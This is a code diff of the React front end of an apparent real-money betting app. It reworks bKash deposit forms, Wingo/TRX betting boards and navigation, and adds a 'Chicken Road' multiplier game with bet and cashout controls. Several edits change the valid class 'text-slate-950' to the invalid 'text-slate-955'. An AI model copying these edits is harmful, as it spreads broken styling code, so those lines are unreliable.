+                                                    <span>Sender details</span>
+                                                </div>
+
+                                                <div className="space-y-2">
                                                     <input 
                                                         type="tel" 
-                                                        placeholder="e.g., 017XXXXXXXX" 
+                                                        placeholder="Sender Account/Phone Number"
                                                         value={senderNumber} 
                                                         onChange={e => setSenderNumber(e.target.value)} 
-                                                        className="w-full bg-white border border-slate-200 rounded-xl py-3 px-4 text-xs focus:outline-none font-mono"
+                                                        className="w-full bg-slate-50 border border-slate-200 rounded-xl py-3 px-4 text-xs font-semibold focus:outline-none focus:ring-1 focus:ring-[#8a2be2] font-mono"
                                                     />
-                                                </div>
-
-                                                <div>
-                                                    <label className="block text-slate-500 text-[10px] font-bold uppercase mb-1">bKash Transaction ID (TxID)</label>
                                                     <input 
                                                         type="text" 
-                                                        placeholder="Enter 8-10 digit TxID" 
+                                                        placeholder="Enter Transaction ID (TxID)" 
                                                         value={transactionId} 
                                                         onChange={e => setTransactionId(e.target.value)} 
-                                                        className="w-full bg-white border border-slate-200 rounded-xl py-3 px-4 text-xs focus:outline-none font-mono uppercase"
+                                                        className="w-full bg-slate-50 border border-slate-200 rounded-xl py-3 px-4 text-xs font-semibold focus:outline-none focus:ring-1 focus:ring-[#8a2be2] font-mono uppercase"
                                                     />
                                                 </div>
-
-                                                <button 
-                                                    type="submit" 
-                                                    disabled={isDepositing}
-                                                    className="w-full py-3.5 bg-gradient-to-r from-rose-600 to-[#e2136e] text-white font-extrabold rounded-xl text-xs uppercase tracking-wider shadow-md transition-opacity"
-                                                >
-                                                    {isDepositing ? 'Submitting request...' : 'Submit Deposit Ticket'}
-                                                </button>
-                                            </form>
-                                        </>
-                                    ) : (
-                                        <div className="space-y-3">
-                                            <h3 className="text-xs font-bold text-slate-600 uppercase tracking-wide">My Historical Deposits</h3>
-                                            {(depositHistory || []).length === 0 ? (
-                                                <div className="text-center py-10 bg-white border rounded-2xl p-6 text-slate-400 text-xs">
-                                                    <Icon name="receipt" className="w-8 h-8 mx-auto text-slate-300 mb-2" />
-                                                    <span>No historical deposit receipts found.</span>
-                                                </div>
-                                            ) : (
-                                                (depositHistory || []).map(item => (
-                                                    <div key={item.id} className="bg-white p-3.5 rounded-xl border border-slate-200/60 shadow-sm flex flex-col space-y-2">
-                                                        <div className="flex justify-between items-center">
-                                                            <span className="text-xs font-black text-[#e2136e]">৳{Number(item.amount || 0).toFixed(2)}</span>
-                                                            <span className={`text-[9px] font-bold px-2 py-0.5 rounded-full ${
-                                                                item.status === 'Success' ? 'bg-emerald-100 text-emerald-800' :
-                                                                item.status === 'Rejected' ? 'bg-rose-100 text-rose-800' : 'bg-amber-100 text-[#e2136e]'
-                                                            }`}>
-                                                                {item.status}
-                                                            </span>
-                                                        </div>
-                                                        <div className="grid grid-cols-2 gap-1 text-[10px] text-slate-500 pt-1.5 border-t border-slate-50 font-mono">
-                                                            <span>Sender: {item.sender}</span>
-                                                            <span className="text-right">TXID: {item.txid}</span>
-                                                            <span className="col-span-2 text-slate-400 mt-1">{item.timestamp}</span>
-                                                        </div>
-                                                    </div>
-                                                ))
-                                            )}
+                                            </div>
                                         </div>
-                                    )}
-                                </div>
+                                    </div>
+                                ) : (
+                                    /* Historical Deposits List tab */
+                                    <div className="flex-1 p-4 space-y-3 overflow-y-auto pb-24 font-sans">
+                                        <h3 className="text-xs font-bold text-slate-600 uppercase tracking-wide">Historical Deposit tickets</h3>
+                                        {(depositHistory || []).length === 0 ? (
+                                            <div className="text-center py-10 bg-white border rounded-2xl p-6 text-slate-400 text-xs">
+                                                <Icon name="receipt" className="w-8 h-8 mx-auto text-slate-300 mb-2" />
+                                                <span>No historical deposit receipts found.</span>
+                                            </div>
+                                        ) : (
+                                            (depositHistory || []).map(item => (
+                                                <div key={item.id} className="bg-white p-3.5 rounded-xl border border-slate-200/60 shadow-sm flex flex-col space-y-2">
+                                                    <div className="flex justify-between items-center">
+                                                        <span className="text-xs font-black text-[#e2136e]">৳{Number(item.amount || 0).toFixed(2)}</span>
+                                                        <span className={`text-[9px] font-bold px-2 py-0.5 rounded-full ${
+                                                            item.status === 'Success' ? 'bg-emerald-100 text-emerald-800' :
+                                                            item.status === 'Rejected' ? 'bg-rose-100 text-rose-800' : 'bg-amber-100 text-[#e2136e]'
+                                                        }`}>
+                                                            {item.status}
+                                                        </span>
+                                                    </div>
+                                                    <div className="grid grid-cols-2 gap-1 text-[10px] text-slate-500 pt-1.5 border-t border-slate-50 font-mono">
+                                                        <span>Sender: {item.sender}</span>
+                                                        <span className="text-right">TXID: {item.txid}</span>
+                                                        <span className="col-span-2 text-slate-400 mt-1">{item.timestamp}</span>
+                                                    </div>
+                                                </div>
+                                            ))
+                                        )}
+                                    </div>
+                                )}
+
+                                {/* Sticky professional footer */}
+                                {depositTab === 'new' && (
+                                    <div className="bg-white border-t border-slate-100 px-4 py-3 flex justify-between items-center flex-shrink-0 font-sans">
+                                        <div>
+                                            <span className="text-[10px] text-slate-500 block leading-tight font-semibold">Recharge Method:</span>
+                                            <span className="text-xs font-extrabold text-slate-900 leading-tight block mt-0.5">{selectedChannel}</span>
+                                        </div>
+                                        <button 
+                                            type="button"
+                                            onClick={processDeposit}
+                                            disabled={isDepositing}
+                                            className={`px-8 py-3 rounded-xl text-white font-bold text-xs uppercase shadow transition-all ${
+                                                isDepositing ? 'bg-slate-400 cursor-not-allowed' : 'bg-slate-900 hover:bg-black active:scale-95'
+                                            }`}
+                                        >
+                                            {isDepositing ? 'Processing...' : 'Deposit'}
+                                        </button>
+                                    </div>
+                                )}
                             </div>
                         )}
 
@@ -1801,7 +2088,7 @@
                             </div>
                         )}
 
-                        {/* VIEW: GAME PLAY WINDOW */}
+                        {/* VIEW: GAME PLAY WINDOW (WINGO CLASSIC & TRX) */}
                         {view === 'game' && (
                             <div className="flex-1 flex flex-col bg-slate-50 justify-between relative overflow-y-auto">
                                 
@@ -1862,10 +2149,6 @@
                                         <button onClick={() => { setView('deposit'); setDepositTab('new'); }} className="bg-white/10 hover:bg-white/20 text-white px-3 py-1.5 rounded-lg text-[10px] font-bold">Deposit Funds</button>
                                     </div>
 
-                                    {/* ==================================================== */}
-                                    {/* BETTING CONTROLS PANEL */}
-                                    {/* ==================================================== */}
-                                    
                                     {/* Action Buttons: Red, Green, Violet */}
                                     <div className="grid grid-cols-3 gap-2">
                                         <button onClick={() => openBetConfirmation('green')} className="bg-gameGreen hover:opacity-90 text-white py-3 rounded-xl font-bold text-xs shadow-md transition-opacity">Green</button>
@@ -1902,7 +2185,7 @@
 
                                     {/* Big / Small Betting Nodes */}
                                     <div className="grid grid-cols-2 gap-2">
-                                        <button onClick={() => openBetConfirmation('big')} className="bg-[#e0b50f] hover:opacity-90 py-2.5 rounded-xl font-black text-xs text-slate-950 shadow-md transition-opacity">BIG</button>
+                                        <button onClick={() => openBetConfirmation('big')} className="bg-[#e0b50f] hover:opacity-90 py-2.5 rounded-xl font-black text-xs text-slate-955 shadow-md transition-opacity">BIG</button>
                                         <button onClick={() => openBetConfirmation('small')} className="bg-[#1e88e5] hover:opacity-90 py-2.5 text-white rounded-xl font-black text-xs shadow-md transition-opacity">SMALL</button>
                                     </div>
 
@@ -1921,15 +2204,10 @@
                                         </div>
                                     </div>
 
-                                    {/* ==================================================== */}
-                                    {/* COUNTERS & TIME REMAINING PANEL */}
-                                    {/* ==================================================== */}
-
-                                    {/* Counter & Period status display */}
+                                    {/* Counters & Timers */}
                                     {gameType === 'trx_wingo' ? (
                                         /* AUTHENTIC TRX BOARD UI WITH THE YELLOW GOLD THEME & SPHERES */
                                         <div className="bg-[#fcc911] p-4 rounded-3xl border border-yellow-500 text-slate-900 relative shadow-md">
-                                            {/* Header Section */}
                                             <div className="flex items-center space-x-3 mb-4">
                                                 <div className="bg-[#dfaf0a] rounded-2xl px-3 py-2 text-center text-white flex flex-col justify-center items-center shadow-inner min-w-[85px]">
                                                     <svg className="w-5 h-5 text-white animate-spin mb-1" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5">
@@ -1951,7 +2229,6 @@
                                                 </div>
                                             </div>
 
-                                            {/* Period ID and Ticking Counter Row */}
                                             <div className="flex justify-between items-center py-2.5 border-t border-yellow-600/20">
                                                 <div>
                                                     <span className="text-[10px] text-yellow-900 font-extrabold block">Active Period</span>
@@ -1970,7 +2247,6 @@
                                                 </div>
                                             </div>
 
-                                            {/* Dynamic Block Hash character display spheres */}
                                             <div className="flex justify-between items-center mt-3 bg-[#e8b90c] p-3 rounded-2xl border border-yellow-600/20">
                                                 <span className="text-[10px] font-black text-yellow-950 uppercase tracking-wide">Block Hash:</span>
                                                 <div className="flex space-x-1.5">
@@ -1985,7 +2261,6 @@
                                                 </div>
                                             </div>
 
-                                            {/* COUNTDOWN LOCKING SCREEN OVERLAY */}
                                             {getTimerForActiveTab() <= 5 && (
                                                 <div className="absolute inset-0 bg-black/90 z-50 flex flex-col items-center justify-center p-2 rounded-3xl backdrop-blur-sm animate-fade-in">
                                                     <span className="text-white text-[10px] font-bold uppercase tracking-widest mb-3 animate-pulse">Betting locked. Settle in progress</span>
@@ -2050,8 +2325,8 @@
                                     )}
 
                                     {/* History logs section */}
-                                    <div className="bg-white rounded-2xl border border-slate-100 overflow-hidden shadow-sm">
-                                        <div className="grid grid-cols-2 border-b border-slate-100 text-center text-[10px] font-bold">
+                                    <div className="bg-white rounded-2xl border border-slate-100 overflow-hidden shadow-sm font-sans">
+                                        <div className="grid grid-cols-2 border-b border-slate-100 text-center text-[10px] font-bold font-sans">
                                             <button onClick={() => setGameSubTab('history')} className={`py-3 ${gameSubTab === 'history' ? 'border-b-2 border-primary text-primary' : 'text-slate-400'}`}>Game History</button>
                                             <button onClick={() => setGameSubTab('my_history')} className={`py-3 ${gameSubTab === 'my_history' ? 'border-b-2 border-primary text-primary' : 'text-slate-400'}`}>My Bets</button>
                                         </div>
@@ -2061,9 +2336,9 @@
                                                 /* CONDITIONAL RENDER: TRX BLOCK CHAIN VERIFICATION DIRECTORY */
                                                 gameType === 'trx_wingo' ? (
                                                     <div className="overflow-x-auto">
-                                                        <table className="w-full text-[10px] text-left border-collapse">
+                                                        <table className="w-full text-[10px] text-left border-collapse font-sans">
                                                             <thead>
-                                                                <tr className="bg-[#fbc911] text-yellow-950 font-bold border-b border-yellow-500/30">
+                                                                <tr className="bg-[#fbc911] text-yellow-955 font-bold border-b border-yellow-500/30">
                                                                     <th className="py-2.5 px-1.5 text-center">Period</th>
                                                                     <th className="py-2.5 px-1 text-center">Block height</th>
                                                                     <th className="py-2.5 px-1 text-center">Block time</th>
@@ -2181,11 +2456,211 @@
                                 </div>
                             </div>
                         )}
+
+                        {/* VIEW: CHICKEN ROAD & CHICKEN ROAD 2 PLAY SCREEN (NEW!) */}
+                        {view === 'game_chicken' && (
+                            <div className="flex-1 flex flex-col bg-[#111622] justify-between relative overflow-y-auto text-white">
+                                {/* Header */}
+                                <div className="px-4 py-3 flex items-center justify-between bg-[#191f2c] border-b border-slate-800 shadow-md flex-shrink-0">
+                                    <button onClick={() => setView('home')} className="text-white hover:text-slate-300">
+                                        <Icon name="chevron-left" className="w-8 h-8" />
+                                    </button>
+                                    <div className="flex flex-col items-center">
+                                        <span className="text-xs font-black tracking-widest text-[#fccd11] font-mono">
+                                            {gameType === 'chicken_road' ? 'CHICKEN ROAD' : 'CHICKEN ROAD 2'}
+                                        </span>
+                                        <span className="text-[9px] text-slate-400">Survival Multiplier</span>
+                                    </div>
+                                    <div className="flex space-x-1.5 items-center">
+                                        <span className="text-[10px] text-emerald-400 font-extrabold bg-emerald-950/80 px-2.5 py-1 rounded-full border border-emerald-900 font-mono">
+                                            ৳{Number(balance).toFixed(2)}
+                                        </span>
+                                    </div>
+                                </div>
+
+                                {/* Main Active Interactive Lanes Board */}
+                                <div className="p-4 flex-1 flex flex-col justify-center space-y-4">
+                                    
+                                    <div className="text-center font-semibold text-[10px] uppercase tracking-widest text-slate-400">
+                                        {chickenActive ? 'Game in Progress - Jump the Sewer Lanes!' : 'Set Bet & Press Play to Start'}
+                                    </div>
+
+                                    {/* Highway / Sewer lane horizontal scrolling track */}
+                                    <div className={`w-full overflow-x-auto flex relative py-8 min-h-[160px] border border-slate-800 rounded-3xl ${
+                                        gameType === 'chicken_road' ? 'bg-[#0f141d]' : 'bg-[#1e2330]'
+                                    }`}>
+                                        
+                                        {/* Start point Arch Tunnel */}
+                                        <div className="w-16 flex-shrink-0 border-r-2 border-slate-800 bg-[#0b0e16] flex flex-col justify-center items-center relative">
+                                            <span className="text-[8px] text-slate-500 uppercase font-black tracking-wider block mb-1">Sidewalk</span>
+                                            {chickenStep === -1 && !chickenCrash && (
+                                                <span className="text-3xl animate-bounce z-10">🐔</span>
+                                            )}
+                                        </div>
+
+                                        {/* 9 Game columns corresponding to multipliers */}
+                                        {activeChickenMults.map((mult, index) => {
+                                            const isActive = chickenStep === index;
+                                            const isPassed = chickenStep > index;
+                                            const isCrashSpot = chickenCrash && chickenStep === index;
+
+                                            return (
+                                                <div 
+                                                    key={index} 
+                                                    onClick={() => {
+                                                        if (chickenActive && index === chickenStep + 1) {
+                                                            handleChickenStep();
+                                                        }
+                                                    }}
+                                                    className={`w-20 flex-shrink-0 border-r border-dashed border-slate-800 flex flex-col justify-between items-center py-2 px-1 relative transition-colors ${
+                                                        isActive ? 'bg-indigo-950/30' : (index === chickenStep + 1 && chickenActive ? 'bg-slate-800/40 cursor-pointer border border-yellow-500/30' : '')
+                                                    }`}
+                                                >
+                                                    {/* Multiplier Bubble */}
+                                                    <span className={`text-[10px] font-black font-mono px-2 py-0.5 rounded-full ${
+                                                        isActive ? 'bg-[#fccd11] text-slate-950' : (isPassed ? 'bg-emerald-500 text-white' : 'bg-slate-800 text-slate-400')
+                                                    }`}>
+                                                        {mult}x
+                                                    </span>
+
+                                                    {/* Interactive Manhole / Sewer cover graphics */}
+                                                    <div className="relative my-4 flex items-center justify-center">
+                                                        {isActive && !chickenCrash ? (
+                                                            <div className="text-3xl animate-pulse z-10 filter drop-shadow-md">🐔</div>
+                                                        ) : isCrashSpot ? (
+                                                            <div className="text-3xl z-10 animate-bounce">💥</div>
+                                                        ) : (
+                                                            <div className={`w-11 h-11 rounded-full border-2 flex items-center justify-center ${
+                                                                gameType === 'chicken_road' 
+                                                                    ? 'bg-slate-800 border-slate-600 text-slate-500' 
+                                                                    : 'bg-zinc-700 border-zinc-500 text-zinc-400'
+                                                            }`}>
+                                                                <span className="text-[10px] font-black">◎</span>
+                                                            </div>
+                                                        )}
+                                                    </div>
+
+                                                    {/* Sewer grate graphics at the bottom */}
+                                                    <div className={`w-full h-4 rounded-t-md opacity-45 ${
+                                                        gameType === 'chicken_road' ? 'bg-slate-900 border-t border-slate-700' : 'bg-yellow-600/30 border-t border-yellow-500/20'
+                                                    }`}></div>
+                                                </div>
+                                            );
+                                        })}
+                                    </div>
+
+                                    {/* Crash Error layout alert */}
+                                    {chickenCrash && (
+                                        <div className="p-3.5 bg-rose-500/10 border border-rose-500/30 rounded-2xl text-center text-rose-500 text-xs font-bold animate-pulse">
+                                            {gameType === 'chicken_road' ? 'FALLEN INTO THE SEWER ARCHWAY!' : 'HIT BY A TRUCK ON HIGHWAY!'} Game Over!
+                                        </div>
+                                    )}
+
+                                    {/* Bottom Settings Panel */}
+                                    <div className="bg-[#191f2c] p-4 rounded-2xl space-y-4 border border-slate-800/80">
+                                        
+                                        {/* 1. Set Difficulty selectors */}
+                                        <div>
+                                            <span className="text-[10px] font-bold text-slate-400 uppercase tracking-wider block mb-2">Crossing Difficulty:</span>
+                                            <div className="grid grid-cols-4 gap-1.5 bg-[#0f141d] p-1 rounded-xl">
+                                                {['easy', 'medium', 'hard', 'hardcore'].map(diff => (
+                                                    <button 
+                                                        disabled={chickenActive}
+                                                        key={diff} 
+                                                        onClick={() => setChickenDifficulty(diff)}
+                                                        className={`py-2 text-[10px] font-black uppercase rounded-lg transition-all ${
+                                                            chickenDifficulty === diff 
+                                                                ? 'bg-[#fccd11] text-slate-950 font-black shadow' 
+                                                                : 'text-slate-400 hover:text-slate-200 disabled:opacity-40'
+                                                        }`}
+                                                    >
+                                                        {diff}
+                                                    </button>
+                                                ))}
+                                            </div>
+                                        </div>
+
+                                        {/* 2. Amount Ajusters & Play triggers */}
+                                        <div className="flex items-center space-x-3">
+                                            {/* MIN/MAX Controls */}
+                                            <div className="flex flex-col space-y-1">
+                                                <span className="text-[10px] font-bold text-slate-400 uppercase tracking-wider">Bet Amount:</span>
+                                                <div className="flex bg-[#0f141d] rounded-xl border border-slate-800 overflow-hidden max-w-[150px]">
+                                                    <button 
+                                                        disabled={chickenActive}
+                                                        onClick={() => setChickenBet(10)} 
+                                                        className="px-3 py-2 text-[10px] font-bold text-slate-300 border-r border-slate-800 bg-slate-900 hover:bg-slate-800"
+                                                    >
+                                                        Min
+                                                    </button>
+                                                    <input 
+                                                        type="number" 
+                                                        disabled={chickenActive}
+                                                        value={chickenBet} 
+                                                        onChange={e => setChickenBet(Math.max(1, parseInt(e.target.value) || 0))} 
+                                                        className="w-16 bg-transparent text-center font-bold text-xs focus:outline-none font-mono"
+                                                    />
+                                                    <button 
+                                                        disabled={chickenActive}
+                                                        onClick={() => setChickenBet(500)} 
+                                                        className="px-3 py-2 text-[10px] font-bold text-slate-300 border-l border-slate-800 bg-slate-900 hover:bg-slate-800"
+                                                    >
+                                                        Max
+                                                    </button>
+                                                </div>
+                                            </div>
+
+                                            {/* Big Game triggers action */}
+                                            <div className="flex-1 flex flex-col justify-end pt-4">
+                                                {!chickenActive ? (
+                                                    <button 
+                                                        onClick={startChickenGame}
+                                                        className="w-full py-3 bg-[#18b660] hover:bg-[#149d4e] active:scale-95 transition-all text-white font-black uppercase text-xs rounded-xl shadow-lg shadow-emerald-950/40 tracking-wider"
+                                                    >
+                                                        Play Game
+                                                    </button>
+                                                ) : (
+                                                    <div className="grid grid-cols-2 gap-2 w-full">
+                                                        <button 
+                                                            onClick={handleChickenStep}
+                                                            className="py-3 bg-[#fccd11] hover:bg-goldHover text-slate-950 font-black uppercase text-[10px] rounded-xl tracking-wider transition-all"
+                                                        >
+                                                            Jump next
+                                                        </button>
+                                                        <button 
+                                                            onClick={() => handleChickenCashout()}
+                                                            className="py-3 bg-[#e2136e] hover:bg-rose-700 text-white font-black uppercase text-[10px] rounded-xl tracking-wider transition-all"
+                                                        >
+                                                            Cashout
+                                                        </button>
+                                                    </div>
+                                                )}
+                                            </div>
+                                        </div>
+
+                                        {/* Presets amounts shortcut row */}
+                                        {!chickenActive && (
+                                            <div className="grid grid-cols-4 gap-1.5 pt-1.5 border-t border-slate-800/60">
+                                                {[10, 50, 100, 200].map(val => (
+                                                    <button 
+                                                        key={val} 
+                                                        onClick={() => setChickenBet(val)}
+                                                        className="py-1 bg-slate-800/80 hover:bg-slate-700 rounded-lg text-[10px] font-bold"
+                                                    >
+                                                        ৳{val}
+                                                    </button>
+                                                ))}
+                                            </div>
+                                        )}
+
+                                    </div>
+                                </div>
+                            </div>
+                        )}
+
                     </div>
 
-                    {/* ==================================================== */}
                     {/* DYNAMIC BET PLACEMENT POPUP SHEET - ALIGNED TO TOP */}
-                    {/* ==================================================== */}
                     {isBetSheetOpen && (
                         <div className="absolute inset-0 bg-slate-900/60 z-[90] flex flex-col justify-start animate-fade-in font-sans">
                             <div className="bg-white rounded-b-[2rem] p-5 space-y-4 max-h-[90%] overflow-y-auto shadow-2xl border-b border-slate-200">
@@ -2257,7 +2732,7 @@
                                         <span className="text-[10px] text-slate-400 block">Total cost:</span>
                                         <span className="text-xl font-black text-emerald-600">৳{(selectedUnit * multiplier).toFixed(2)}</span>
                                     </div>
-                                    <button onClick={confirmBetPlacement} className="px-5 py-3 bg-gradient-to-r from-emerald-600 to-green-500 text-slate-950 font-black rounded-xl text-xs uppercase">Confirm Bet</button>
+                                    <button onClick={confirmBetPlacement} className="px-5 py-3 bg-gradient-to-r from-emerald-600 to-green-500 text-slate-955 font-black rounded-xl text-xs uppercase">Confirm Bet</button>
                                 </div>
                             </div>
                         </div>
@@ -2306,7 +2781,7 @@
                                 )}
                                 <button 
                                     onClick={() => { setShowResultPopup(false); }} 
-                                    className="mt-6 w-full py-3 bg-gradient-to-r from-yellow-400 to-[#fccd11] hover:to-yellow-300 text-slate-950 font-black rounded-xl text-xs uppercase tracking-wider shadow-all active:scale-95"
+                                    className="mt-6 w-full py-3 bg-gradient-to-r from-yellow-400 to-[#fccd11] hover:to-yellow-300 text-slate-955 font-black rounded-xl text-xs uppercase tracking-wider shadow-all active:scale-95"
                                 >
                                     Close Window
                                 </button>
@@ -2323,20 +2798,20 @@
                     <div className="bg-white border-b border-gray-200 py-3 px-6 flex justify-between items-center relative z-20 shadow-[0_2px_10px_rgba(0,0,0,0.03)] flex-shrink-0">
                         <button onClick={() => { setView('home'); setActiveNav('home'); }} className={`flex flex-col items-center space-y-1 ${activeNav === 'home' ? 'text-[#8a2be2]' : 'text-slate-400'}`}>
                             <Icon name="home" className="w-5 h-5" />
-                            <span className="text-[10px] font-bold">Home</span>
+                            <span className="text-[10px] font-bold font-sans">Home</span>
                         </button>
                         <button onClick={() => { setView('home'); setActiveNav('activity'); }} className={`flex flex-col items-center space-y-1 ${activeNav === 'activity' ? 'text-[#8a2be2]' : 'text-slate-400'}`}>
                             <Icon name="gift" className="w-5 h-5" />
-                            <span className="text-[10px] font-bold">Activity</span>
+                            <span className="text-[10px] font-bold font-sans">Activity</span>
                         </button>
                         <button onClick={() => { setView('home'); setActiveNav('promotion'); }} className={`flex flex-col items-center space-y-1 ${activeNav === 'promotion' ? 'text-[#8a2be2]' : 'text-slate-400'}`}>
                             <Icon name="percent" className="w-5 h-5" />
-                            <span className="text-[10px] font-bold">Promo</span>
+                            <span className="text-[10px] font-bold font-sans">Promo</span>
                         </button>
                         <button onClick={() => { setView('home'); setActiveNav('account'); }} className={`flex flex-col items-center space-y-1 relative ${activeNav === 'account' ? 'text-[#8a2be2]' : 'text-slate-400'}`}>
                             <Icon name="user" className="w-5 h-5" />
                             {hasPendingWithdraw && <span className="absolute top-0 right-0.5 w-2 h-2 bg-amber-500 rounded-full animate-ping"></span>}
-                            <span className="text-[10px] font-bold">Account</span>
+                            <span className="text-[10px] font-bold font-sans">Account</span>
                         </button>
                     </div>
                 );
